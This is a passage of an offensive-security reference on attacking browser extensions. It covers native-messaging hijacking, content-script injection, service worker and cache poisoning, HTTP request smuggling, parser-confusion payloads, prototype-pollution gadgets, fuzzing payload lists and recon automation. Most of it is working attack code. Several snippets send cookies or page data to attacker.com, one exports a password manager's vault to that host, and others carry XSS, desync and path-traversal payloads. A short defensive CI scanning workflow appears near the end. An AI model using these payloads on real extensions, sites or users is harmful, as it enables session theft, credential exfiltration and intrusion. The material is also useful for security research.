// ATTACK 4: Native Host Registry/Plist Poisoning
// ================================================================

// Windows: Registry key defines native host location
// HKEY_CURRENT_USER\Software\Google\Chrome\NativeMessagingHosts\com.company.host

// If registry is writable by user, redirect to attacker binary:
// Attacker creates: C:\Users\Victim\evil_host.exe
// Modifies registry to point to evil_host.exe

// macOS: ~/Library/Application Support/Google/Chrome/NativeMessagingHosts/com.company.host.json
// Linux: ~/.config/google-chrome/NativeMessagingHosts/com.company.host.json
```

### Native Messaging Exploitation via Extension Compromise

```javascript
// If extension is compromised, native messaging is fully compromised:

// Step 1: Compromise extension via XSS or message passing
// Step 2: Use compromised extension to send native messages:

chrome.runtime.sendNativeMessage('com.company.passwordmanager', {
  action: "export",
  format: "json",
  destination: "https://attacker.com/receive"
});

// Or:
chrome.runtime.sendNativeMessage('com.company.vpn', {
  action: "connect",
  server: "attacker-controlled-server.com"
});
```

---

## Content Script Injection Chains

### Content Script Injection Methods

```javascript
// ================================================================
// METHOD 1: tabs.executeScript
// ================================================================

// If extension has "scripting" or "tabs" permission:
chrome.tabs.executeScript(tabId, {
  code: `
    // This runs in page context with extension privileges
    fetch('https://attacker.com/?c=' + document.cookie);
  `
});

// ================================================================
// METHOD 2: scripting.executeScript (MV3)
// ================================================================

chrome.scripting.executeScript({
  target: {tabId: tabId},
  func: stealData,
  args: ['https://attacker.com']
});

function stealData(attackerUrl) {
  fetch(attackerUrl + '/?c=' + document.cookie);
}

// ================================================================
// METHOD 3: Content Script Dynamic Injection
// ================================================================

// If extension can inject content scripts dynamically:
chrome.scripting.registerContentScripts([{
  id: "injection",
  matches: ["https://victim.com/*"],
  js: ["stealer.js"],
  runAt: "document_start"
}]);

// ================================================================
// METHOD 4: Web Accessible Resource Injection
// ================================================================

// If extension exposes injectable scripts:
// Attacker loads script into page:
const script = document.createElement('script');
script.src = 'chrome-extension://ID/injected.js';
document.head.appendChild(script);

// If injected.js has privileged code that can be triggered:
// window.extensionAPI.execute({code: 'malicious'})
```

### Content Script -> Page Context Escalation

```javascript
// ================================================================
// ESCALATION: Content Script Isolation Bypass
// ================================================================

// Content scripts run in "isolated world" - separate JS context
// But they share DOM. To access page JS:

// Method 1: Inject script into page DOM
const script = document.createElement('script');
script.textContent = `
  // This runs in PAGE context, not content script context
  const data = {
    localStorage: localStorage,
    sessionStorage: sessionStorage,
    cookies: document.cookie,
    tokens: window.authToken,
    secrets: window.secrets
  };

  // Send back to content script via postMessage
  window.postMessage({type: 'STOLEN', data: data}, '*');
`;
document.documentElement.appendChild(script);

// Content script listens:
window.addEventListener('message', (event) => {
  if (event.data.type === 'STOLEN') {
    chrome.runtime.sendMessage({action: "exfil", data: event.data.data});
  }
});

// Method 2: Event handler injection
const div = document.createElement('div');
div.setAttribute('onclick', `
  fetch('https://attacker.com/?c='+document.cookie)
`);
document.body.appendChild(div);
div.click();

// Method 3: srcdoc iframe with javascript:
const iframe = document.createElement('iframe');
iframe.srcdoc = `
  <script>
    parent.postMessage({
      secret: window.parent.secretVariable
    }, '*');
  </script>
`;
document.body.appendChild(iframe);
```

---

## Service Worker + Extension Chains

### Service Worker Attack Surface

In MV3, background pages are replaced by Service Workers:
- Ephemeral (terminate when idle)
- No DOM access
- Event-driven
- Can be woken by messages, alarms, push notifications

### Service Worker Exploitation

```javascript
// ================================================================
// ATTACK 1: Service Worker Wake + Message Flood
// ================================================================

// Service Workers terminate after being idle
// But can be woken by messages

// Flood messages to keep service worker alive and exploit:
setInterval(() => {
  chrome.runtime.sendMessage(EXT_ID, {
    action: "keepAlive",
    payload: {
      // Nested payload that might bypass validation
      nested: {
        action: "getSecrets"
      }
    }
  });
}, 1000);

// ================================================================
// ATTACK 2: Service Worker Cache Poisoning
// ================================================================

// Service Workers control caching via Cache API
// Poison cache to serve malicious responses:

// In compromised extension:
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((response) => {
      if (response) {
        // Return poisoned cache entry
        return response;
      }
      return fetch(event.request);
    })
  );
});

// Poison cache:
caches.open('extension-cache').then((cache) => {
  cache.put(
    'https://api.example.com/user',
    new Response(JSON.stringify({isAdmin: true}))
  );
});

// ================================================================
// ATTACK 3: Service Worker + Push Notification Abuse
// ================================================================

// If extension uses push notifications:
// Push payload might be processed without validation

self.addEventListener('push', (event) => {
  const data = event.data.json();
  // VULNERABLE: No validation on push payload
  if (data.action === "updateConfig") {
    chrome.storage.local.set(data.config);
  }
});

// Attacker sends push via compromised server:
// {action: "updateConfig", config: {proxy: "attacker.com"}}
```

---

## Cache Poisoning + Extension Chains

### Web Cache Entanglement with Extensions

Extensions can interact with web caches in multiple ways:
1. Content scripts modifying cacheable content
2. Background scripts making cacheable requests
3. Extension pages being cached by CDN

### Extension-Specific Cache Poisoning

```javascript
// ================================================================
// ATTACK 1: Poisoning Extension Resource Cache
// ================================================================

// If extension loads resources from web:
// And those resources are cacheable:

// Attacker poisons cache for extension resource:
fetch('https://cdn.example.com/extension-resource.js', {
  headers: {
    'X-Forwarded-Host': 'attacker.com'
  }
});

// Extension loads poisoned resource:
// const script = document.createElement('script');
// script.src = 'https://cdn.example.com/extension-resource.js';

// ================================================================
// ATTACK 2: Extension as Cache Oracle
// ================================================================

// If extension reflects unkeyed inputs in cacheable responses:
// Use extension page as cache oracle

// Request:
GET /extension/page.html HTTP/1.1
Host: example.com
X-Extension-Header: <script>alert(1)</script>

// If extension reflects this header and response is cached:
// All users get XSS when loading extension page

// ================================================================
// ATTACK 3: Fat GET via Extension Requests
// ================================================================

// If extension makes GET requests with bodies (fat GET):
// And cache excludes body from cache key:

// Extension request:
GET /api/data HTTP/1.1
Host: api.example.com
Content-Length: 20

malicious=parameter

// Cache key: GET|api.example.com|/api/data
// Body not in key, so poisoned response served to all
```

### Cache Parameter Cloaking via Extensions

```javascript
// If extension adds parameters that are excluded from cache key:
// Use cloaking to hide malicious parameters

// Normal request:
GET /search?q=legit HTTP/1.1

// Poisoned request (akamai-transform excluded from key):
GET /search?q=legit?akamai-transform=<script>alert(1)</script> HTTP/1.1

// Cache key: /search?q=legit
// But application sees: q=legit?akamai-transform=<script>alert(1)</script>
// If q parameter is reflected, XSS achieved
```

---

## Request Smuggling + Extension Chains

### Browser-Powered Desync Attacks

Extensions can be used to trigger client-side desync attacks:

```javascript
// ================================================================
// ATTACK: Extension-Triggered Client-Side Desync
// ================================================================

// If extension makes requests that can be desynchronized:
// Use extension's privileged requests to poison connection pools

// Step 1: Extension makes desync-prone request
chrome.webRequest.onBeforeRequest.addListener((details) => {
  // Extension makes POST to static file (ignores CL)
  fetch('https://victim.com/favicon.ico', {
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\nX: Y',
    credentials: 'include'
  });
}, {urls: ["https://victim.com/*"]});

// Step 2: Victim's subsequent request is poisoned
// GET /admin is prepended to victim's request
// Result: Victim accesses admin functionality
```

### Extension + HTTP Request Smuggling

```javascript
// ================================================================
// ATTACK: Extension as Smuggling Vector
// ================================================================

// If extension has webRequest and can modify headers:
// Inject smuggling headers into extension requests

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    details.requestHeaders.push({
      name: 'Content-Length',
      value: '5'
    });
    details.requestHeaders.push({
      name: 'Transfer-Encoding',
      value: 'chunked'
    });
    return {requestHeaders: details.requestHeaders};
  },
  {urls: ["<all_urls>"]},
  ["blocking", "requestHeaders"]
);

// Extension requests now carry smuggling payloads
// Front-end sees CL, back-end sees TE -> desync
```

### CL.0 Desync via Extension

```javascript
// If extension endpoints ignore Content-Length:
// Use extension requests to trigger CL.0 desync

// Vulnerable extension endpoint:
POST /extension/endpoint HTTP/1.1
Host: victim.com
Content-Length: 44

GET /admin HTTP/1.1
Host: victim.com

// Extension ignores CL, treats body as new request
// Next request on connection gets prepended with GET /admin
```

---

## Parser Confusion Payloads

### HTTP Parser Confusion

```http
# ================================================================
# PAYLOAD 1: Host Header Confusion
# ================================================================

# Invalid host triggers backend callback:
GET / HTTP/1.1
Host: attacker.com.collaborator.net
Connection: close

# Host overriding via request line:
GET http://internal-website.mil/ HTTP/1.1
Host: public-website.mil
Connection: close

# ================================================================
# PAYLOAD 2: Ambiguous Request Routing
# ================================================================

# Incapsula tolerant parsing:
GET / HTTP/1.1
Host: incapsula-client.net:80@attacker.net
Connection: close

# Apache HttpComponents @ bypass:
GET @attacker.net/ HTTP/1.1
Host: newrelic.com
Connection: close

# ================================================================
# PAYLOAD 3: URL Parsing Confusion
# ================================================================

# Multiple Host headers:
GET / HTTP/1.1
Host: victim.com
Host: attacker.com

# Space-prefixed header (hidden from some parsers):
GET / HTTP/1.1
 Host: attacker.com
Host: victim.com

# Tab-prefixed header:
GET / HTTP/1.1
\tHost: attacker.com
Host: victim.com

# ================================================================
# PAYLOAD 4: Transfer-Encoding Obfuscation
# ================================================================

# Classic obfuscations:
Transfer-Encoding : chunked
Transfer-Encoding: \tchunked
Transfer-Encoding\t:\tchunked
 Transfer-Encoding: chunked
Transfer-Encoding: chunked\x00
X: X\r\nTransfer-Encoding: chunked

# ================================================================
# PAYLOAD 5: Content-Length Confusion
# ================================================================

# Duplicate Content-Length:
Content-Length: 0
Content-Length: 44

# Negative Content-Length:
Content-Length: -1

# Oversized Content-Length:
Content-Length: 9999999999

# ================================================================
# PAYLOAD 6: HTTP/2 Downgrade Confusion
# ================================================================

# H2.TE desync:
:method POST
:path /
:authority victim.com
:scheme https
transfer-encoding: chunked
\r\n
0\r\n
malicious-prefix

# H2.CL desync:
:method POST
:path /
:authority victim.com
:scheme https
content-length: 0
\r\n
GET /admin HTTP/1.1\r\n
Host: victim.com\r\n
\r\n
```

### Extension-Specific Parser Confusion

```javascript
// ================================================================
// PAYLOAD 7: Extension Message Format Confusion
// ================================================================

// JSON vs non-JSON message confusion:
chrome.runtime.sendMessage(EXT_ID, "not-json-but-string", (response) => {
  // Handler might parse differently
});

// Array vs Object confusion:
chrome.runtime.sendMessage(EXT_ID, ["action", "getData"], (response) => {
  // Handler expects object, receives array
});

// ================================================================
// PAYLOAD 8: Origin Validation Parser Confusion
// ================================================================

// Unicode normalization bypass:
// Use Unicode characters that normalize to different values
// NFC vs NFD forms:
const nfc = 'e\u0301';  // e + combining acute accent
const nfd = '\u00e9';  // precomposed

// If extension normalizes origin before comparison:
// attacker.com vs attacker.com might not match after normalization

// ================================================================
// PAYLOAD 9: URL Encoding Confusion in Extension URLs
// ================================================================

// chrome-extension:// URL encoding:
chrome-extension://ID%2Fpath%2Ffile.js  // Encoded slashes
chrome-extension://ID/path%2F..%2F..%2Fetc%2Fpasswd  // Path traversal

// Query parameter confusion:
chrome-extension://ID/page.html?param=%26action%3DgetToken  // Nested params
```

---

## Browser Quirks

### Chrome-Specific Behaviors

```javascript
// ================================================================
// QUIRK 1: Chrome Extension ID Enumeration
// ================================================================

// Chrome assigns extension IDs based on public key hash
// Predictable IDs for unpacked extensions
// Can enumerate by loading chrome://extensions and scraping

// Alternative: Check chrome://version for loaded extensions
// Look for --load-extension flags in command line

// ================================================================
// QUIRK 2: Chrome Web Store Policy Bypass
// ================================================================

// Extensions can use declarativeNetRequest to modify requests
// Without needing webRequest permission (MV3)
// This bypasses some CSP restrictions

// ================================================================
// QUIRK 3: Chrome DevTools Protocol Access
// ================================================================

// If Chrome started with --remote-debugging-port:
// Can access DevTools Protocol to manipulate extensions
fetch('http://localhost:9222/json/list')
  .then(r => r.json())
  .then(tabs => {
    // Find extension background page
    const extPage = tabs.find(t => t.url.startsWith('chrome-extension://'));
    // Connect to extension via WebSocket
  });

// ================================================================
// QUIRK 4: Chrome Profile Extension Sharing
// ================================================================

// Extensions installed in one profile are accessible to other profiles
// If multiple profiles exist, extension data might leak between them
```

### Firefox-Specific Behaviors

```javascript
// ================================================================
// QUIRK 5: Firefox Extension ID Format
// ================================================================

// Firefox uses UUIDs or email-based IDs
// IDs like: extension-name@developer.com
// Or: {uuid-format-1234-5678-90ab-cdef}

// ================================================================
// QUIRK 6: Firefox Storage Access
// ================================================================

// Firefox extensions have broader storage access
// Can access both extension storage and some browser storage

// ================================================================
// QUIRK 7: Firefox Native Messaging Differences
// ================================================================

// Firefox uses different registry keys / plist locations
// Windows: HKEY_CURRENT_USER\Software\Mozilla\NativeMessagingHosts\
// macOS: ~/Library/Application Support/Mozilla/NativeMessagingHosts/
// Linux: ~/.mozilla/native-messaging-hosts/
```

### Cross-Browser Quirks

```javascript
// ================================================================
// QUIRK 8: postMessage Origin Inconsistencies
// ================================================================

// Chrome: event.origin is always fully qualified URL
// Firefox: event.origin might differ for file:// URLs
// Safari: event.origin handling for sandboxed iframes differs

// ================================================================
// QUIRK 9: Message Size Limits
// ================================================================

// Chrome: ~64MB for runtime.sendMessage
// Firefox: ~1MB for runtime.sendMessage
// Exceeding limits causes silent failures or errors

// ================================================================
// QUIRK 10: Async Response Handling
// ================================================================

// Chrome: sendResponse callback must be called synchronously
// or return true for async
// Firefox: More lenient async handling

// Vulnerability: If extension expects sync but gets async:
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  // Expects immediate response
  fetch(request.url)
    .then(r => r.json())
    .then(data => sendResponse(data));
  // Missing return true; causes response to be lost
});
```

---

## Gadget Chains

### Client-Side Prototype Pollution Gadgets

From BlackFan's research (client-side-prototype-pollution):

```javascript
// ================================================================
// GADGET: jQuery $.get -> XSS
// ================================================================
// Payload: ?__proto__[context]=<img/src/onerror%3dalert(1)>
//          &__proto__[jquery]=x

// ================================================================
// GADGET: jQuery $.get >= 3.0.0 -> XSS
// ================================================================
// Payload: ?__proto__[url][]=data:,alert(1)//
//          &__proto__[dataType]=script

// ================================================================
// GADGET: Google reCAPTCHA -> XSS
// ================================================================
// Payload: ?__proto__[srcdoc][]=<script>alert(1)</script>

// ================================================================
// GADGET: Google Tag Manager -> XSS
// ================================================================
// Payload: ?__proto__[vtp_enableRecaptcha]=1
//          &__proto__[srcdoc]=<script>alert(1)</script>

// ================================================================
// GADGET: DOMPurify <= 2.0.12 Bypass
// ================================================================
// Payload: ?__proto__[ALLOWED_ATTR][0]=onerror
//          &__proto__[ALLOWED_ATTR][1]=src

// ================================================================
// GADGET: Vue.js -> XSS
// ================================================================
// Payload: ?__proto__[v-if]=_c.constructor('alert(1)')()
// Payload: ?__proto__[template]=<script>alert(1)</script>

// ================================================================
// GADGET: Google Analytics -> Cookie Injection
// ================================================================
// Payload: ?__proto__[cookieName]=COOKIE%3DInjection%3B
```

### Extension-Specific Gadget Chains

```javascript
// ================================================================
// CHAIN 1: Prototype Pollution -> Extension Config -> Message Bypass
// ================================================================

// Step 1: Pollute prototype to modify extension config
// ?__proto__[trustedOrigins]=["*"]

// Step 2: Extension checks config.trustedOrigins.includes(origin)
// Now includes('*') returns true for any origin

// Step 3: Send malicious messages from attacker.com
chrome.runtime.sendMessage(EXT_ID, {action: "getAllData"});

// ================================================================
// CHAIN 2: DOM Clobbering -> Extension Handler Bypass
// ================================================================

// Step 1: Find extension checking window.config
// if (window.config.debug) { ... }

// Step 2: DOM clobber to create config object
// <a id="config"><a id="debug" href="x"></a></a>

// Step 3: window.config.debug is now truthy (HTMLAnchorElement)
// Extension enters debug mode, might expose more functionality

// ================================================================
// CHAIN 3: postMessage -> Content Script -> Background -> Native Host
// ================================================================

// Step 1: postMessage to content script (no origin check)
window.postMessage({type: "EXT_ACTION", action: "nativeCall"}, "*");

// Step 2: Content script relays to background
chrome.runtime.sendMessage({action: "nativeCall"});

// Step 3: Background sends to native host
chrome.runtime.sendNativeMessage("com.company.host", {
  command: "execute",
  cmd: "malicious_command"
});

// ================================================================
// CHAIN 4: XSS on Trusted Domain -> Extension Message -> Full Compromise
// ================================================================

// Step 1: Find XSS on domain trusted by extension
// https://trusted.com/page?xss=<script>...

// Step 2: From XSS, send messages to extension
// chrome.runtime.sendMessage(EXT_ID, {action: "getToken"});

// Step 3: Exfiltrate tokens, cookies, storage data
```

---

## Real World Case Studies

### Case Study 1: CursedChrome - Extension Implant Framework

**Source**: https://github.com/mandatoryprogrammer/CursedChrome

**Overview**: Chrome extension implant that turns victim browsers into fully-functional HTTP proxies, allowing attackers to browse sites as victims.

**Attack Flow**:
```
1. Attacker installs CursedChrome extension (via social engineering, malicious update, etc.)
2. Extension connects to attacker C2 server via WebSocket
3. Attacker uses web admin panel to view connected "bots"
4. Attacker configures HTTP proxy credentials
5. All victim traffic is proxied through attacker's browser
6. Attacker can browse as victim with full session/cookies
```

**Required Permissions**:
```json
{
  "permissions": [
    "webRequest",
    "webRequestBlocking",
    "<all_urls>",
    "cookies"
  ]
}
```

**Key Techniques**:
- Uses `webRequest` API to intercept and proxy all HTTP/HTTPS traffic
- Cookie sync extension for client-side cookie exfiltration
- WebSocket C2 communication for real-time control
- CA certificate installation for HTTPS interception

**Defense**: ChromeGalvanizer project generates enterprise policies to prevent such attacks.

### Case Study 2: postMessage Tracker - Extension Analysis

**Source**: https://github.com/fransr/postMessage-tracker

**Purpose**: Chrome extension to track postMessage usage (url, domain, stack) both by logging and visually.

**Key Findings from Research**:
- Many extensions use postMessage without proper origin validation
- Wrapper detection (Raven, New Relic, Rollbar, Bugsnag, jQuery) reveals hidden listeners
- Short-lived listeners are common and easily missed
- Cross-window communication paths can be complex (top -> frames[0] -> frames[1])

**Usage for Bug Hunting**:
```javascript
// Install postMessage-tracker
// Browse target website
// Check extension popup for postMessage listeners
// Review console logs for message flows
// Identify missing origin checks
```

### Case Study 3: Collaborator Everywhere - Backend System Discovery

**Source**: https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

**Technique**: Burp Suite extension that injects payloads containing unique identifiers into all proxied traffic to identify backend systems.

**Key Payloads**:
```http
X-Forwarded-For: a.burpcollaborator.net
True-Client-IP: b.burpcollaborator.net
Referer: http://c.burpcollaborator.net/
X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
```

**Extension Angle**: Extensions making requests with these headers can trigger backend callbacks, revealing infrastructure.

### Case Study 4: Browser-Powered Desync Attacks

**Source**: https://portswigger.net/research/browser-powered-desync-attacks

**Key Innovation**: Using browser fetch() to trigger desync attacks on single-server websites.

**Extension Application**:
```javascript
// Extension can trigger CSD attacks programmatically:
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    chrome.scripting.executeScript({
      target: {tabId: tabId},
      func: () => {
        // Trigger CSD from extension context
        fetch('https://victim.com/favicon.ico', {
          method: 'POST',
          body: "GET /admin HTTP/1.1\r\nX: Y",
          mode: 'no-cors',
          credentials: 'include'
        });
      }
    });
  }
});
```

### Case Study 5: Web Cache Entanglement

**Source**: https://portswigger.net/research/web-cache-entanglement

**Key Techniques**:
- Cache parameter cloaking (hiding params from cache key)
- Fat GET requests (GET with body not in cache key)
- Cache key normalization bypasses
- Internal cache poisoning

**Extension Cache Poisoning**:
```javascript
// If extension makes cacheable requests with unkeyed inputs:
// Poison extension's cache to serve malicious responses

// Example: Extension loads translations from cacheable endpoint
// Poison with XSS payload in translation strings
GET /api/i18n/en HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com

// Response cached:
{"Show more": "<svg onload=alert(1)>"}

// All extension users get XSS when "Show more" is displayed
```

### Case Study 6: HTTP/1.1 Must Die - Desync Endgame

**Source**: https://portswigger.net/research/http1-must-die

**Key Findings**:
- Parser discrepancy detection methodology
- V-H (Visible-Hidden) and H-V (Hidden-Visible) discrepancies
- 0.CL desync attacks via early-response gadgets
- Expect-based desync attacks

**Extension Relevance**:
- Extensions with `webRequest` can inject headers causing parser discrepancies
- Extension requests can be used to probe for V-H/H-V discrepancies
- Extension update mechanisms can be targeted with desync attacks

---

## Fuzzing Payloads

### Extension Message Passing Fuzzing

```javascript
// ================================================================
// FUZZ PAYLOAD SET 1: Type Confusion
// ================================================================

const typeConfusionPayloads = [
  null,
  undefined,
  0,
  -1,
  999999999999999999999n,
  NaN,
  Infinity,
  -Infinity,
  true,
  false,
  "",
  "null",
  "undefined",
  "[object Object]",
  "function() {}",
  "() => {}",
  "__proto__",
  "constructor",
  "prototype",
  Symbol("test"),
  Symbol.for("test"),
  {},
  [],
  new Date(),
  new RegExp(".*"),
  new Error("test"),
  new Map(),
  new Set(),
  new WeakMap(),
  new WeakSet(),
  Promise.resolve(),
  Promise.reject(),
  new Proxy({}, {}),
  function() {},
  async function() {},
  function*() {},
  async function*() {},
  class Test {},
  new Uint8Array(100),
  new ArrayBuffer(100),
  new SharedArrayBuffer(100),
  new DataView(new ArrayBuffer(100)),
  new Int8Array(100),
  new Float64Array(100),
  {toString: () => "evil"},
  {valueOf: () => 42},
  {[Symbol.toPrimitive]: () => "evil"},
  {[Symbol.iterator]: function*() { yield "evil"; }},
];

// ================================================================
// FUZZ PAYLOAD SET 2: Prototype Pollution
// ================================================================

const prototypePollutionPayloads = [
  {"__proto__": {"admin": true}},
  {"__proto__": {"isAdmin": true}},
  {"__proto__": {"role": "admin"}},
  {"__proto__": {"permissions": ["*"]}},
  {"__proto__": {"trusted": true}},
  {"constructor": {"prototype": {"admin": true}}},
  {"prototype": {"admin": true}},
  {"__proto__": {"toString": () => "admin"}},
  {"__proto__": {"valueOf": () => true}},
  {"__proto__": {"then": () => ({"then": () => "evil"})}},
  {"__proto__": {"catch": () => "evil"}},
  {"__proto__": {"finally": () => "evil"}},
  {"__proto__": {"constructor": {"prototype": {"admin": true}}}},
];

// ================================================================
// FUZZ PAYLOAD SET 3: Deep Nesting / Recursion
// ================================================================

function createNestedObject(depth, payload) {
  if (depth === 0) return payload;
  return {nested: createNestedObject(depth - 1, payload)};
}

const deepPayloads = [
  createNestedObject(100, "payload"),
  createNestedObject(1000, "payload"),
  createNestedObject(10000, "payload"),
  {a: {b: {c: {d: {e: {f: {g: {h: {i: {j: "deep"}}}}}}}}}},
];

// ================================================================
// FUZZ PAYLOAD SET 4: Large Data
// ================================================================

const largePayloads = [
  {data: "A".repeat(1000000)},
  {data: "\x00".repeat(1000000)},
  {data: "\xff".repeat(1000000)},
  {data: new Array(1000000).fill("item")},
  {data: Buffer.alloc(100000000)},
];

// ================================================================
// FUZZ PAYLOAD SET 5: Special Characters / Encoding
// ================================================================

const encodingPayloads = [
  {data: "\x00\x01\x02\x03\x04\x05"},
  {data: "\xff\xfe\xfd\xfc\xfb\xfa"},
  {data: "\u0000\u0001\u0002\u0003"},
  {data: "\u2028\u2029"},  // Line/paragraph separators
  {data: "\ufeff"},  // BOM
  {data: "\u200b\u200c\u200d"},  // Zero-width characters
  {data: "\uffff\ufffe"},  // Invalid Unicode
  {data: "<script>alert(1)</script>"},
  {data: "javascript:alert(1)"},
  {data: "data:text/html,<script>alert(1)</script>"},
  {data: "\\x41\\x42\\x43"},  // Escaped sequences
  {data: "%3Cscript%3Ealert(1)%3C/script%3E"},  // URL encoded
  {data: "&#60;script&#62;alert(1)&#60;/script&#62;"},  // HTML entities
];

// ================================================================
// FUZZ PAYLOAD SET 6: Extension-Specific Actions
// ================================================================

const actionFuzzPayloads = [
  {action: null},
  {action: undefined},
  {action: ""},
  {action: "__proto__"},
  {action: "constructor"},
  {action: "prototype"},
  {action: "toString"},
  {action: "valueOf"},
  {action: "then"},
  {action: "catch"},
  {action: "finally"},
  {action: "admin"},
  {action: "getToken"},
  {action: "getCookies"},
  {action: "getStorage"},
  {action: "getHistory"},
  {action: "getBookmarks"},
  {action: "getPasswords"},
  {action: "executeScript"},
  {action: "injectCSS"},
  {action: "openTab"},
  {action: "closeTab"},
  {action: "modifyRequest"},
  {action: "interceptResponse"},
  {action: "nativeMessage"},
  {action: "download"},
  {action: "upload"},
  {action: "getPermissions"},
  {action: "requestPermissions"},
  {action: "removePermissions"},
  {action: "getManifest"},
  {action: "getBackgroundPage"},
  {action: "getViews"},
  {action: "getAllFrames"},
  {action: "sendMessage"},
  {action: "connect"},
  {action: "onMessage"},
  {action: "onConnect"},
  {action: "onInstalled"},
  {action: "onUpdated"},
  {action: "onRemoved"},
  {action: "onActivated"},
  {action: "onMoved"},
  {action: "onHighlighted"},
  {action: "onDetached"},
  {action: "onAttached"},
];
```

### HTTP Fuzzing for Extension Endpoints

```http
# ================================================================
# FUZZ PAYLOAD SET 7: Extension Endpoint Probing
# ================================================================

# Common extension endpoints:
GET /manifest.json HTTP/1.1
Host: chrome-extension://ID

GET /background.js HTTP/1.1
Host: chrome-extension://ID

GET /content.js HTTP/1.1
Host: chrome-extension://ID

GET /popup.html HTTP/1.1
Host: chrome-extension://ID

GET /options.html HTTP/1.1
Host: chrome-extension://ID

GET /_locales/en/messages.json HTTP/1.1
Host: chrome-extension://ID

# ================================================================
# FUZZ PAYLOAD SET 8: Web Accessible Resources
# ================================================================

GET /injected.js HTTP/1.1
Host: chrome-extension://ID

GET /images/logo.png HTTP/1.1
Host: chrome-extension://ID

GET /css/style.css HTTP/1.1
Host: chrome-extension://ID

GET /fonts/font.woff2 HTTP/1.1
Host: chrome-extension://ID

# ================================================================
# FUZZ PAYLOAD SET 9: Extension API Endpoints
# ================================================================

POST /api/message HTTP/1.1
Host: chrome-extension://ID
Content-Type: application/json

{"action": "fuzz", "payload": "test"}

POST /api/storage HTTP/1.1
Host: chrome-extension://ID
Content-Type: application/json

{"key": "test", "value": "test"}

POST /api/auth HTTP/1.1
Host: chrome-extension://ID
Content-Type: application/json

{"token": "test", "provider": "test"}
```

---

## Automation Workflows

### Recon Automation

```bash
#!/bin/bash
# ================================================================
# WORKFLOW 1: Extension Enumeration
# ================================================================

# Step 1: Find extensions in Chrome Web Store for target domain
# Use store search API or scrape

# Step 2: Download extension CRX
# Chrome Web Store has download endpoint:
# https://clients2.google.com/service/update2/crx?response=redirect&prodversion=119.0&x=id%3DEXTENSION_ID%26installsource%3Dondemand%26uc

# Step 3: Extract CRX (it's a ZIP)
unzip extension.crx -d extension_source/

# Step 4: Analyze manifest.json for permissions and attack surface
cat extension_source/manifest.json | jq '.permissions, .host_permissions, .content_scripts, .web_accessible_resources'

# Step 5: Search for vulnerable patterns in source code
grep -r "onMessage" extension_source/ --include="*.js"
grep -r "postMessage" extension_source/ --include="*.js"
grep -r "sendMessage" extension_source/ --include="*.js"
grep -r "externally_connectable" extension_source/ --include="*.json"
grep -r "chrome.cookies" extension_source/ --include="*.js"
grep -r "chrome.storage" extension_source/ --include="*.js"
grep -r "chrome.tabs.executeScript" extension_source/ --include="*.js"
grep -r "chrome.scripting" extension_source/ --include="*.js"
grep -r "chrome.downloads" extension_source/ --include="*.js"
grep -r "chrome.webRequest" extension_source/ --include="*.js"
grep -r "chrome.permissions" extension_source/ --include="*.js"
grep -r "eval(" extension_source/ --include="*.js"
grep -r "Function(" extension_source/ --include="*.js"
grep -r "setTimeout.*string" extension_source/ --include="*.js"
grep -r "setInterval.*string" extension_source/ --include="*.js"
grep -r "innerHTML" extension_source/ --include="*.js"
grep -r "document.write" extension_source/ --include="*.js"

# Step 6: Check for hardcoded secrets
trufflehog filesystem extension_source/

# Step 7: Identify message passing vulnerabilities
# Look for missing sender validation
```

### Automated Extension Testing

```javascript
// ================================================================
// WORKFLOW 2: Automated Extension Vulnerability Scanner
// ================================================================

const puppeteer = require('puppeteer');

async function scanExtension(extId) {
  const browser = await puppeteer.launch({
    headless: false,
    args: [
      `--disable-extensions-except=/path/to/extension`,
      `--load-extension=/path/to/extension`
    ]
  });

  const page = await browser.newPage();

  // Test 1: Message passing without validation
  const messages = [
    {action: "getToken"},
    {action: "getCookies"},
    {action: "getStorage"},
    {action: "getHistory"},
    {action: "execute", code: "alert(1)"}
  ];

  for (const msg of messages) {
    try {
      const response = await page.evaluate((extId, msg) => {
        return new Promise((resolve) => {
          chrome.runtime.sendMessage(extId, msg, (response) => {
            resolve({response, error: chrome.runtime.lastError});
          });
        });
      }, extId, msg);

      console.log(`Message ${JSON.stringify(msg)}:`, response);
    } catch (e) {
      console.log(`Message ${JSON.stringify(msg)} failed:`, e.message);
    }
  }

  // Test 2: postMessage to content script
  await page.goto('https://example.com'); // Page where content script runs
  await page.evaluate(() => {
    window.postMessage({type: 'EXT_REQUEST', action: 'getData'}, '*');
  });

  // Test 3: externally_connectable abuse
  // If extension allows external connections from attacker.com
  await page.goto('https://attacker.com');
  await page.evaluate((extId) => {
    chrome.runtime.sendMessage(extId, {action: "test"}, console.log);
  }, extId);

  await browser.close();
}
```

### Continuous Monitoring Workflow

```yaml
# ================================================================
# WORKFLOW 3: CI/CD Extension Security Scanning
# ================================================================

# GitHub Actions workflow for extension security
name: Extension Security Scan

on:
  push:
    paths:
      - 'extension/**'
  schedule:
    - cron: '0 0 * * *'  # Daily

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Install dependencies
        run: |
          npm install -g pp-finder
          pip install trufflehog

      - name: Run pp-finder for prototype pollution gadgets
        run: |
          cd extension
          pp-finder run -- node background.js

      - name: Scan for secrets
        run: |
          trufflehog filesystem extension/

      - name: Static analysis for vulnerable patterns
        run: |
          # Check for missing sender validation
          if grep -r "onMessage" extension/ --include="*.js" | grep -v "sender.url" | grep -v "sender.origin"; then
            echo "WARNING: Potential missing sender validation"
          fi

          # Check for eval usage
          if grep -r "eval(" extension/ --include="*.js"; then
            echo "WARNING: eval() usage found"
          fi

          # Check for innerHTML
          if grep -r "innerHTML" extension/ --include="*.js"; then
            echo "WARNING: innerHTML usage found"
          fi

      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: security-scan-results
          path: scan-results/
```

---

## Recon Methodology

### Phase 1: Extension Discovery

```
1. Chrome Web Store Search
   - Search for target domain name
   - Search for target brand name
   - Search for related services
   - Check "Related" and "More from this developer"

2. Extension ID Enumeration
   - Check chrome://extensions for installed extensions
   - Use known extension ID lists (password managers, VPNs, etc.)
   - Probe chrome-extension://ID/manifest.json for 200 responses

